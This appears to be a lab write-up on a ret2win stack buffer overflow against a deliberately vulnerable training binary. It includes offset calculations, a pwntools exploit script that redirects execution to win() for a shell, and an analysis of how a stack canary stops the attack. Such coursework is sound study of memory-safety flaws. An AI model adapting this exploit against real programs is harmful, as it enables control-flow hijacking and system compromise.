# Stage 4 Writeup: Binary Exploitation I – Control Flow Hijack (ret2win)

## Overview & Binary Protections
Analysis of the target binary (`vuln`) protections using `checksec`:
* **Arch:** amd64-64-little
* **RELRO:** Partial RELRO
* **Stack Canary:** No canary found (disabled in base binary)
* **NX:** Enabled (Stack pages marked Non-Executable)
* **PIE:** Disabled (Static base addresses at `0x400000`)

---

## Exercise 1: Base Control Flow Hijack (`buffer`)

### 1. Vulnerability Analysis
The function `vulnerable()` reads up to 256 bytes into a local stack buffer using `read(0, buffer, 256)`. Since input size exceeds buffer capacity, an unbounded stack buffer overflow (CWE-121) occurs.

### 2. Offset Calculation
* **Initial Buffer Size:** 64 bytes
* **Saved RBP:** 8 bytes
* **Total Offset to Return Address (RIP):** `64 + 8 = 72 bytes`

---

## Exercise 2: Buffer Resizing & Dynamic Offset (`buffer`)

### 1. Code Modification
To verify understanding of stack layout, `vuln.c` was modified to increase the buffer size:
```c
void vulnerable(void) {
    char buffer[128]; // Resized from 64 to 128 bytes
    puts("Enter data:");
    read(0, buffer, 256);
    puts("Done.");
}
```

### 2. Recalculating the Offset
* **New Buffer Size:** 128 bytes
* **Saved RBP:** 8 bytes
* **New Offset to Return Address:** `128 + 8 = 136 bytes`

### 3. Exploit Script (`exploit.py`)
```python
from pwn import *

elf = context.binary = ELF("./vuln")

OFFSET = 136

payload = flat({OFFSET: elf.symbols["win"]})

io = process("./vuln")
io.recvuntil(b"Enter data:")
io.sendline(payload)
io.interactive()
```

### 4. Verification
Executing `python3 exploit.py` successfully overwrote the saved return address at offset 136, redirecting execution to `win()` and opening an interactive shell.

---

## Exercise 3: Mitigation Analysis – Stack Canary (`vuln_canary`)

### 1. Compilation
The binary was recompiled with Stack Canary protection enabled:
```bash
gcc -g -O0 -no-pie -o vuln_canary vuln.c
```

### 2. Execution & Failure Mode
Running the buffer overflow exploit against `./vuln_canary` resulted in immediate termination:
```text
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

### 3. Root Cause Analysis
* **Canary Placement:** The compiler inserts a guard value (Canary) on the stack right between local variables and the Saved RBP (`[rbp-8]`).
* **Detection:** Overwriting 136 bytes corrupts the Canary before reaching RIP.
* **Abort:** In the function epilogue, the program verifies the stack Canary. Upon detecting a mismatch, execution halts immediately via `__stack_chk_fail()`, preventing the control flow hijack.
